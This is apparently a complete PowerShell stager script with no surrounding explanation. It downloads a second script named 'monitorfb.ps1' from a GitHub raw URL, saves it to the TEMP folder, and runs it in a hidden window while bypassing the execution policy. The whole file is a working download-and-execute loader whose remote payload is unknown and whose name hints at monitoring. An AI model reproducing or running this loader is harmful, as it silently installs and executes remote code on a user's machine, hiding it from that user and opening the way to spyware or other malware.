$secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/monitorfb.ps1"
$secondScript = Invoke-WebRequest -Uri $secondScriptUrl

$scriptPath = "$env:TEMP\secondScript.ps1"
$secondScript.Content | Out-File -FilePath $scriptPath -Encoding UTF8

Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden -Wait